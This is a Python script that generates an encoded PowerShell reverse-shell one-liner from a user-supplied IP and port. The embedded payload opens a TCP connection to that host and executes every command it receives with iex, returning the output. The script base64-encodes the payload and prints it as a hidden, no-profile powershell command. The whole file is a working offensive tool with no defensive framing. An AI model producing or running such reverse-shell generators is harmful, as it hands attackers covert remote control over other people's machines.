import sys
import base64
import getopt

def main(argv):
	IP = ''
	Port = ''
	opts, args = getopt.getopt(argv, "hi:p:",["help","ip=","port="])
	for opt, arg in opts:
		if opt == '-h' or opt == '--help':
			print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - -')
			print ('psh_reverse_OneLine.py -i/--ip <ip> -p/--port <port>')
			print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - -')
			sys.exit()
		elif opt in ("-i", "--ip"):
			IP = arg
		elif opt in ("-p", "--port"):
			Port = arg
	payload = '$client = New-Object System.Net.Sockets.TCPClient("' + IP + '", ' + Port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
	encoded_str = base64.b64encode(payload.encode('utf16')[2:]).decode()
	Command = 'powershell -nop -w hidden -e ' + encoded_str
	print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - -')
	print ('The Powershell Reverse Shell One Liner :')
	print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - -')
	print (Command)


if __name__ == "__main__":
   main(sys.argv[1:])
